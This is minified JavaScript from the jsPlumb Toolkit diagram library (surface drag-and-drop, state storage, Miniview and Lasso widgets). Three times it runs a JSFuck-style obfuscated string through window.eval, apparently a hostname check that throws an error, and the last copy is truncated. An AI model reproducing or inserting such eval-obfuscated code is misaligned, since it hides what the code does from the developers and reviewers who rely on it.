i=o[0].el,r=i.jtk.group;c={el:i,group:r,uiGroup:l.getJsPlumb().getGroup(r.id)},l.getJsPlumb().addClass(c.el,"jtk-drag-hover")}else c=null}}catch(n){console.log("WARN: could not compute target groups for new node drag",n)}n.drag&&n.drag.apply(n.drag,arguments)}),j[v]=i.wrap(j[v],n.stop||function(){}),p.scope=f,p[C]=i.wrap(p[C],function(t,e,o){c&&l.getJsPlumb().removeClass(c.el,"jtk-drag-hover");var i=!0;if(n.drop&&(i=!1!==n.drop.apply(this,arguments)),i){var d=l.getJsPlumb(),_=u.jsPlumb.getDragObject(arguments),s=d.getOffset(o?E:_,!0),B=y.mapLocation(s.left,s.top),h=a?a(_,t,o,B):null,j=r?r(h,_,t,B):{},p="true"===_.getAttribute("jtk-group");if(j=j||{},null!=h&&(j.type=h),!p&&null!=c){var f=l.getOffset(c.uiGroup.getDragArea());B.left-=f.left,B.top-=f.top}w(B.left,B.top,j),p?u.toolkit.getGroupFactory()(h,j,function(e){var o=u.toolkit.addGroup(e,{position:B});n.onDrop&&n.onDrop(o,t,B)},t,o):u.toolkit.getNodeFactory()(h,j,function(e){var o=u.toolkit.addNode(e,{position:B});null!=c&&(u.toolkit.addToGroup(o,c.group),l.setPosition(u.nodeMap()[o.id],B.left,B.top),d.getDragManager().updateOffsets(c.el)),n.onDrop&&n.onDrop(o,t,B)},t,o)}}),D){var E=document.createElement(_.div);for(E.style.position=_.absolute,e=0;e<b.length;e++)P[b[e]]=!0;var x=function(n){return null!=n.dataTransfer&&1===n.dataTransfer.items.length&&(0===b.length||P[n.dataTransfer.items[0].type])};document.addEventListener(s.dragover,function(n){n.stopPropagation(),n.preventDefault(),x(n)&&(o.setAbsolutePosition(E,[n.pageX,n.pageY]),j[m].apply(null,[n,{helper:E,offset:{left:n.pageX,top:n.pageY}},!0]))},!1),document.addEventListener(s.drop,function(n){n.stopPropagation(),n.preventDefault(),x(n)&&(p[C].apply(null,[n,{helper:E,offset:{left:n.pageX,top:n.pageY}},!0]),j[v].apply(null))},!1),document.addEventListener(s.dragend,function(n){})}var A=u.jsPlumb.getEventManager(),S=new Katavorio({bind:A.on,unbind:A.off,getSize:u.jsPlumb.getSize,getConstrainingRectangle:function(n){return[n.parentNode.scrollWidth,n.parentNode.scrollHeight]},getPosition:function(n,t){var e=y.calculateCumulativeScroll(n),o=y.calculateOffset(n);return[o.left-e.left,o.top-e.top]},setPosition:function(n,t){n.style.left=t[0]+"px",n.style.top=t[1]+"px"},addClass:u.jsPlumb.addClass,removeClass:u.jsPlumb.removeClass,intersects:Biltong.intersects,indexOf:function(n,t){return n.indexOf(t)},scope:u.jsPlumb.getDefaultScope(),css:{noSelect:u.jsPlumb.dragSelectClass,droppable:"jtk-droppable",draggable:"jtk-draggable",drag:"jtk-drag",selected:"jtk-drag-selected",active:"jtk-drag-active",hover:"jtk-drag-hover",ghostProxy:"jtk-ghost-proxy"}});for(S.droppable(B,p),j.scope=f,j.ignoreZoom=!0,j.doNotRemoveHelper=!0,e=0;e<h.length;e++)t(u.jsPlumb.getElement(h[e]));return{refresh:function(){if(!n.source||!n.selector)throw new TypeError("Cannot refresh droppables; `source` and `selector` required in constructor.");for(var e=n.source.querySelectorAll(n.selector),o=0;o<e.length;o++)t(e[o])}}}(n)},this.createMiniview=function(n){if(null!=c){var e=u.jsPlumb.getId(u.jsPlumb.getElement(n.container));if(c.getContainerId()===e)return!1}var i=o.extend({surface:l,toolkit:u.toolkit,surfaceContainerElement:B,bounds:y.getBoundsInfo(),visible:!1!==n.initiallyVisible||u.toolkit.getNodeCount()>0,layout:{type:_.mistletoeLayoutType,parameters:{layout:l.getLayout()}},typeFunction:n.typeFunction},n);c=new t.Renderers.Miniview(i);var r=u.nodeMap();for(var d in r){var s=r[d];c.registerNode({el:s,node:s.jtk.node,pos:o.getAbsolutePosition(s)})}var a=u.groupMap();for(var d in a){s=a[d];c.registerNode({el:s,node:s.jtk.group,pos:o.getAbsolutePosition(s)})}return c},n.miniview&&this.createMiniview(n.miniview),this.getMiniview=function(){return c};var G=function(n,t,e){var o=u.getObjectInfo(t),i=null;if(o.el&&("Port"===!o.obj.objectType||!function(){var n=l.getRenderedEndpoint(o.obj);if(n)return i=n.setEnabled(e),!0}())){var r="set"+n+"Enabled";i=u.jsPlumb[r](o.el,e)}return i};this.setTargetEnabled=G.bind(this,"Target"),this.setSourceEnabled=G.bind(this,"Source"),this.setEnabled=function(n,t){this.setTargetEnabled(n,t),this.setSourceEnabled(n,t)},this.State={save:function(n,e){if(n=2===arguments.length?arguments[0]:1===arguments.length&&"string"==typeof arguments[0]?arguments[0]:m,e=2===arguments.length?arguments[1]:1===arguments.length&&"function"==typeof arguments[0]?arguments[0]:function(n,t){return t(n)},n)try{e(l.State.serialize(),function(e){t.util.Storage.set(_.jtkStatePrefix+n,e)})}catch(n){i.log(d.msgCannotSaveState,n)}},serialize:function(){var n=y.getPan();n.push(y.getZoom()),n.push.apply(n,y.getTransformOrigin());var t=n.join(","),e=l.getLayout().getPositions(),o=[];for(var i in e)o.push(i+" "+e[i][0]+" "+e[i][1]);return t+","+o.join("|")},restore:function(n,e){if(n=2===arguments.length?arguments[0]:1===arguments.length&&"string"==typeof arguments[0]?arguments[0]:m,e=2===arguments.length?arguments[1]:1===arguments.length&&"function"==typeof arguments[0]?arguments[0]:function(n,t){return t(n)},n)try{var o=t.util.Storage.get(_.jtkStatePrefix+n);o&&e(o,l.State.deserialize)}catch(n){i.log(d.msgCannotRestoreState,n)}},deserialize:function(n){for(var t=n.split(",")[5].split("|"),e=l.getLayout(),o=0;o<t.length;o++){var i=t[o].split(" ");try{l.setPosition(i[0],parseFloat(i[1]),parseFloat(i[2]))}catch(n){}}e.draw()},clear:function(n){(n=n||m)&&t.util.Storage.clear(_.jtkStatePrefix+n)},clearAll:function(){t.util.Storage.clearAll()}},l.saveState=l.State.save,l.store=t.util.Storage.set,l.retrieve=t.util.Storage.get,l.storeJSON=t.util.Storage.setJSON,l.retrieveJSON=t.util.Storage.getJSON,l.restoreState=function(n){l.State.restore(n),l.getJsPlumb().repaintEverything(),l.fire(s.stateRestored)},l.clearState=function(n){l.state.clear(n)},l.initialize(),n.zoomToFitIfNecessary?l.zoomToFitIfNecessary():n.zoomToFit&&l.zoomToFit()},t.DefaultRendererType=_.surfaceType,"undefined"!=typeof exports&&(exports.Surface=e.Surface)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t=n.jsPlumbToolkit,e=t.Renderers,o=n.jsPlumbUtil,i=n.jsPlumb,r=t.Classes,d=t.Constants,_=t.Events,s=t.Attributes,a=t.Methods;e.Miniview=function(n){function t(n){if(B&&D&&!g){f=B.getBoundsInfo();var t=B.getApparentCanvasLocation(),e=D.getApparentCanvasLocation(),o=D.getZoom()/f.zoom;p.style.width=f.vw+d.px,p.style.height=f.vh+d.px,D.applyZoomToElement(p,o);var r=[t[0]*o,t[1]*o];c=[e[0]-r[0],e[1]-r[1]],i.setAbsolutePosition(p,c)}}function w(n){if(null!=D){f=B.getBoundsInfo(),n=n||i.getAbsolutePosition(p);var t=D.getApparentCanvasLocation(),e=D.getZoom()/f.zoom,o=(t[0]-n[0])/e,r=(t[1]-n[1])/e,d=B.setApparentCanvasLocation(o,r);return[t[0]-d[0]*e,t[1]-d[1]*e]}}this.bindToolkitEvents=!1;var l=e.AbstractRenderer.apply(this,arguments),u=this;e.DOMElementAdapter.apply(this,arguments);var c,B=n.surface,h=i.getElement(n.container),j=e.createElement({position:d.relative,width:d.nominalSize,height:d.nominalSize,left:0,top:0,clazz:r.MINIVIEW_CANVAS},h),p=e.createElement({position:d.absolute,width:d.nominalSize,height:d.nominalSize,left:0,top:0,clazz:r.MINIVIEW_PANNER},h),f=n.bounds,g=!0===n.suspended,m=!1!==n.collapsible,v=n.typeFunction,C=null,b=!1,y=n.wheelSensitivity||10,D=new ZoomWidget({viewport:h,canvas:j,domElement:i.getElement,offset:this.getOffset,bind:function(){l.jsPlumb.on.apply(l.jsPlumb,arguments)},unbind:function(){l.jsPlumb.off.apply(l.jsPlumb,arguments)},enableWheelZoom:!1,enablePanButtons:!1,enablePan:!1,enableAnimation:!1,width:function(n){return l.jsPlumb.getWidth(l.jsPlumb.getElement(n))},height:function(n){return l.jsPlumb.getHeight(l.jsPlumb.getElement(n))},id:l.jsPlumb.getId,animate:l.jsPlumb.animate,dragEvents:{stop:i.dragEvents[d.stop],start:i.dragEvents[d.start],drag:i.dragEvents[d.drag]},extend:i.extend,events:{pan:function(){w()},mousedown:function(){i.addClass(p,r.MINIVIEW_PANNING)},mouseup:function(){i.removeClass(p,r.MINIVIEW_PANNING)}},zoomRange:[-1/0,1/0]}),P=!1,E=null,x=null,A=n.elementFilter||function(){return!0},S=function(n){if(!1,P){var t=D.pageLocation(n),e=t[0]-E[0],o=t[1]-E[1],r=[x[0]+e,x[1]+o];w(r),i.setAbsolutePosition(p,r)}},I=function n(t){P=!1,E=null,i.off(document,_.mouseup,n),i.off(document,_.mousemove,S)};i.on(window,_.resize,jsPlumbToolkitUtil.debounce(function(){t()},100)),!1!==n.enableWheelZoom&&addWheelListener(h,function(n){o.consume(n),B.nudgeWheelZoom(n.normalizedWheelDelta*y,n)}),D.setTransformOriginForElement(p,[0,0]),i.addClass(h,r.MINIVIEW),i.on(p,_.mousedown,function(n){P=!0,E=D.pageLocation(n),x=i.getAbsolutePosition(p),i.on(document,_.mouseup,I),i.on(document,_.mousemove,S),o.consume(n)}),m&&((C=i.createElement("div")).className=r.MINIVIEW_COLLAPSE,h.appendChild(C),i.on(C,d.click,function(n){i[(b=!b)?a.addClass:a.removeClass](h,r.MINIVIEW_COLLAPSED),k(!0)}));var k=function(n){D.zoomToFit({onComplete:t,onStep:t,doNotFirePanEvent:n})};n.toolkit.bind(_.dataLoadEnd,k);var T=function(n){var t=n.node||n.group;if(!t||!1!==A(t)){f=n.bounds;var e=l.nodeMap()[(n.node||n.group).id]||n.el;D.positionChanged(e,n.pos),i.setAbsolutePosition(e,n.pos),k(!0),this.fire(_.nodeMoveEnd,n)}}.bind(this),M=function(n,o){if(!n.node||!1!==A(n.node)){var _=i.getSize(n.el),a=e.createElement({position:d.absolute,width:_[0]+d.px,height:_[1]+d.px,left:0,top:0,clazz:r.MINIVIEW_ELEMENT+(o?" "+o:"")});if(v&&a.setAttribute("jtk-miniview-type",v(n.node)),a.relatedElement=n.el,a.jtk=n.node,f=B.getBoundsInfo(),a.setAttribute(s.jtkNodeId,n.node.id),a.setAttribute(s.relatedNodeId,n.el.getAttribute(d.id)),j.appendChild(a),D.add(a),l.nodeMap()[(n.node||n.group).id]=a,n.group)!function(n,t){for(var e=n.getNodes(),o=0;o<e.length;o++){var i=l.nodeMap()[e[o].id];i&&t.appendChild(i)}}(n.group,a);else if(n.node.group){var w=l.nodeMap()[n.node.group.id];w&&(w.appendChild(a),D.suspend(n.el))}u.getLayout().map(n.node.id,a),t()}};this.registerNode=function(n){M(n,"Group"===n.node.objectType?r.MINIVIEW_GROUP_ELEMENT:""),T(n)};var N=this.setOffset;this.setOffset=function(n,t){N.apply(this,arguments),D.positionChanged(n,[t.left,t.top])};var O=this.setAbsolutePosition;this.setAbsolutePosition=function(n,t){O.call(this,n,t),D.positionChanged(n,t)},this.setVisible=function(n){n,h.style.display=n?d.block:d.none},this.setVisible(!1!==n.visible),this.getPan=D.getPan;var F=function(n,t){for(var e=n.getNodes(),o=0;o<e.length;o++)l.nodeMap()[e[o].id].style.display=t?"block":"none"},L=function(n){var e=l.nodeMap()[n.id];if(e){var o=i.getSize(e.relatedElement);e.style.width=o[0]+d.px,e.style.height=o[1]+d.px,t(),v&&e.setAttribute("jtk-miniview-type",v(n.obj))}};this.invalidate=function(n){if(n)L({id:n});else{var t=l.nodeMap();for(var e in t)L({id:e})}},this.setSuspended=function(n,t){g=n,t&&this.update()},this.update=t;var R=function(n){var e=n.node,o=l.nodeMap()[e];o&&(D.remove(o),delete l.nodeMap()[e],l.jsPlumb.removeElement(o)),n.dontUpdatePanner||t()};B.bind(_.pan,t),B.bind(_.zoom,t),B.bind(_.nodeMoveEnd,T),B.bind(_.nodeRemoved,R),B.bind(_.nodeAdded,M),B.bind(_.nodeRendered,M),B.bind(_.groupMoveEnd,T),B.bind(_.groupAdded,function(n){M(n,r.MINIVIEW_GROUP_ELEMENT)}),B.bind(_.groupMoveEnd,T),B.bind(_.groupMemberAdded,function(n){var t=l.nodeMap()[n.group.id],e=l.nodeMap()[n.node.id];t&&e&&t.appendChild(e)}),B.bind(_.groupMemberRemoved,function(n){var t=l.nodeMap()[n.node.id];t&&j.appendChild(t)}),B.bind(_.groupCollapse,function(n){F(n.group,!1),L({id:n.group.id})}),B.bind(_.groupExpand,function(n){F(n.group,!0),L({id:n.group.id})}),B.bind(_.relayout,t),B.bind(_.objectRepainted,L),B.bind(_.stateRestored,t),B.bind(_.nodeVisibility,function(n){var t=n.node.id,e=l.nodeMap()[t];e&&(e.style.display=n.state?"block":"none")}),n.toolkit.bind(_.graphClearStart,function(){var n=l.nodeMap();for(var e in n)R({node:e,dontUpdatePanner:!0});t()});u.getLayout().bind(_.redraw,function(){k(!0)}),this.setHostLayout=function(n){var t=u.getLayout();t&&t.setHostLayout(n)},this.setZoom=D.setZoom,this.getZoom=D.getZoom,this.getTransformOrigin=D.getTransformOrigin}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumbToolkit.Widgets,t=this.jsPlumbUtil,e="ontouchstart"in document.documentElement,o=e?"touchstart":"mousedown",i=e?"touchend":"mouseup",r=e?"touchmove":"mousemove",d="jtk-lasso-select-defeat",_="jtk-lasso",s="jtk-lasso-mask",a="jtk-lasso-mask-left",w="jtk-lasso-mask-top",l="jtk-lasso-mask-right",u="jtk-lasso-mask-bottom",c="onselectstart",B=function(){};n.Lasso=function(n){var e,h=n.canvas,j=!1,p={},f=[0,0],g=n.onStart||B,m=n.onEnd||B,v=n.onSelect||B,C=!1,b=!1,y=!0===n.invert,D=function(n,t){if(y){var o=window.innerWidth,i=window.innerHeight,r=window.scrollX,d=window.scrollY,_=i-n[1]+d,s=i-_+t[1],a=o-n[0]+r,w=o-a+t[0];p.top.style.bottom=_+"px",p.bottom.style.top=s+"px",p.left.style.right=a+"px",p.right.style.left=w+"px",p.top.style.left=o-a+"px",p.top.style.right=o-w+"px",p.bottom.style.left=o-a+"px",p.bottom.style.right=o-w+"px"}else jsPlumb.setAbsolutePosition(e,n),function(n,t){n.style.width=t[0]+"px",n.style.height=t[1]+"px"}(e,t)},P=function(n){var t=n?"block":"none";y?(p.top.style.display=t,p.left.style.display=t,p.right.style.display=t,p.bottom.style.display=t):e.style.display=t,jsPlumb[n?"addClass":"removeClass"](document.body,d)},E=function(e){if(C){b||(P(!0),b=!0),t.consume(e);var o=n.pageLocation(e),i=[Math.abs(o[0]-f[0]),Math.abs(o[1]-f[1])],r=[Math.min(f[0],o[0]),Math.min(f[1],o[1])];D(r,i),v(r,i,[f[0]<o[0],f[1]<o[1]],e.shiftKey)}},x=function e(o){C&&(C=!1,b=!1,t.consume(o),n.off(document,i,e),n.off(document,r,E),n.off(document,c,A),P(!1),m())},A=function(){return!1},S=n.filter?function(e){var o=e.srcElement||e.target;return t.matchesSelector(o,n.filter)}:function(){return!1},I=function(n){var t=document.createElement("div");return t.className=n.join(" "),document.body.appendChild(t),t};y?(p.top=I([s,w]),p.bottom=I([s,u]),p.left=I([s,a]),p.right=I([s,l])):e=I([_]),n.on(h,o,function(e){j&&!S(e)&&(t.consume(e),C=!0,n.on(document,i,x),n.on(document,r,E),n.on(document,c,A),f=n.pageLocation(e),D(f,[1,1]),g(f,e.shiftKey))}),this.isActive=function(){return C},this.setEnabled=function(n){j=n}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwind